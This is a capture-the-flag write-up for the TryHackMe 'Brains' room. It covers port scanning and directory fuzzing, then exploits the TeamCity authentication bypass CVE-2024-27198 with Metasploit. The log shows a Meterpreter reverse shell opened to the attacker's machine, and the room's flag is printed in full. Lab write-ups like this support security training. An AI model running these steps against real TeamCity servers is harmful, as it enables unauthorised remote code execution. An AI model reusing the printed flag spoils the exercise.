# Brains - TryHackMe — CTF Writeup

- **OS:** Linux
- **Target IP:** `10.113.188.128`

---

## Enumeration

### Nmap Scan

Starting as usual with a service and port scan using Nmap:

```bash
nmap -sC -sV -A 10.113.188.128
```

**Output:**

```
Nmap scan report for 10.113.188.128
Host is up (0.034s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 67:c9:d9:fa:31:cf:f0:50:a8:41:32:a1:80:0e:de:82 (RSA)
|   256 c2:c8:d4:22:de:f6:98:17:f0:90:e5:f0:fc:6d:3d:a6 (ECDSA)
|_  256 d1:a8:8c:33:28:41:3c:64:71:ee:c1:45:c0:60:90:32 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Maintenance
50000/tcp open  http    Apache Tomcat (language: en)
| http-title: Log in to TeamCity — TeamCity
|_Requested resource was /login.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds
```

Three open ports were found:

- **22** — SSH
- **80** — Apache HTTP server showing a maintenance page
- **50000** — TeamCity login page (Version **2023.11.3**, build 147512)

### Directory Fuzzing

A directory scan was performed on the TeamCity instance using ffuf:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://10.113.188.128:50000/FUZZ \
     -e .php,.txt,.html,.bak \
     -fs 66,0 \
     -t 100 2>/dev/null
```

**Output:**

```
400.html   [Status: 200, Size: 20,    Words: 3,    Lines: 6,   Duration: 55ms]
404.html   [Status: 500, Size: 7590,  Words: 514,  Lines: 227, Duration: 657ms]
favicon.ico [Status: 200, Size: 5430, Words: 11,   Lines: 4,   Duration: 35ms]
login.html [Status: 200, Size: 15333, Words: 2159, Lines: 539, Duration: 244ms]
update     [Status: 403, Size: 13,    Words: 2,    Lines: 1,   Duration: 42ms]
```

Nothing particularly interesting was found beyond the login page and a forbidden `/update` endpoint.

---

## Vulnerability Research

After some research, it turns out that **TeamCity 2023.11.3** is affected by a critical known vulnerability:

> **CVE-2024-27198** is an authentication bypass vulnerability in the TeamCity web component, arising from an alternative path issue ([CWE-288](https://cwe.mitre.org/data/definitions/288.html)). It carries a CVSS base score of **9.8 (Critical)**.

This vulnerability allows an unauthenticated attacker to gain administrative access and achieve Remote Code Execution (RCE) on the server.

---

## Exploitation

### Metasploit

Opening Metasploit and searching for the exploit:

```
msf > search CVE-2024-27198
```

**Output:**

```
exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198  2024-03-04  excellent  Yes  JetBrains TeamCity Unauthenticated Remote Code Execution
```

Loading the module:

```
msf > use exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198
```

Reviewing the options:

```
show options
```

**Required parameters:**

```
Module options (exploit/multi/http/jetbrains_teamcity_rce_cve_2024_27198):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   Proxies                             no        A proxy chain of format type:host:port[...]
   RHOSTS                              yes       The target host(s)
   RPORT              8111             yes       The target port (TCP)
   SSL                false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI          /                yes       The base path to TeamCity
   TEAMCITY_ADMIN_ID  1                yes       The ID of an administrator account to authenticate as
   VHOST                               no        HTTP server virtual host

Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.136    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

Configuration applied:

- `RHOSTS` = `10.113.188.128`
- `RPORT` = `50000`
- `LHOST` = attacker machine IP
- `LPORT` = `4444`

Running the exploit:

```
msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run

[*] Started reverse TCP handler on 192.168.142.170:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. JetBrains TeamCity 2023.11.3 (build 147512) running on Linux.
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9.czNiQnRiYW5nQ00xMHhvamZsNjd3QVRwZmpB.NmU0NzQwYWItMDgwYS00MDE2LWJmMGEtNDBjZWY3MGEwNjRm
[*] Uploading plugin: JsQGhX2i
[*] Sending stage (58073 bytes) to 10.113.188.128
[*] Deleting the plugin...
[+] Deleted /opt/teamcity/TeamCity/work/Catalina/localhost/ROOT/TC_147512_JsQGhX2i
[+] Deleted /home/ubuntu/.BuildServer/system/caches/plugins.unpacked/JsQGhX2i
[*] Meterpreter session 1 opened (192.168.142.170:4444 -> 10.113.188.128:60098) at 2026-02-27 18:37:20 +0100

[!] This exploit may require manual cleanup of '/opt/teamcity/TeamCity/webapps/ROOT/plugins/JsQGhX2i' on the target
```

A Meterpreter session was successfully opened on the target machine.

---

## Post-Exploitation — Flag

Navigating to the home directory:

```bash
cd /home
```

The directory `/home/ubuntu` is present. Listing its contents:

```bash
cd /home/ubuntu && ls
```

**Output:**

```
Mode                 Size  Type  Last modified               Name
040777/rwxrwxrwx     4096  dir   2026-02-27 18:05:04 +0100  .BuildServer
000667/rw-rw-rwx        0  fif   2026-02-27 18:03:58 +0100  .bash_history
100667/rw-rw-rwx      220  fil   2020-02-25 13:03:22 +0100  .bash_logout
100667/rw-rw-rwx     3771  fil   2020-02-25 13:03:22 +0100  .bashrc
040777/rwxrwxrwx     4096  dir   2024-07-02 11:39:13 +0200  .cache
040777/rwxrwxrwx     4096  dir   2024-08-02 10:54:40 +0200  .config
040777/rwxrwxrwx     4096  dir   2024-07-02 11:40:18 +0200  .local
100667/rw-rw-rwx      807  fil   2020-02-25 13:03:22 +0100  .profile
100667/rw-rw-rwx       66  fil   2024-07-02 11:59:35 +0200  .selected_editor
040777/rwxrwxrwx     4096  dir   2024-07-02 11:38:50 +0200  .ssh
100667/rw-rw-rwx        0  fil   2024-07-02 11:39:21 +0200  .sudo_as_admin_successful
100667/rw-rw-rwx      214  fil   2024-07-02 11:46:35 +0200  .wget-hsts
100666/rw-rw-rw-     4829  fil   2024-07-02 16:55:04 +0200  config.log
100666/rw-rw-rw-       38  fil   2024-07-02 12:05:47 +0200  flag.txt
```

Reading the flag:

```bash
cat flag.txt
```

**Flag:**

```
THM{faa9bac345709b6620a6200b484c7594}
```

---

## Tools Summary

| Tool | Purpose | Usage |
|------|---------|-------|
| Nmap | Network scanner | Port discovery and service/version detection |
| ffuf | Web fuzzer | Directory and file enumeration on the TeamCity web interface |
| Metasploit | Exploitation framework | Automated exploitation of CVE-2024-27198 and reverse shell via Meterpreter |
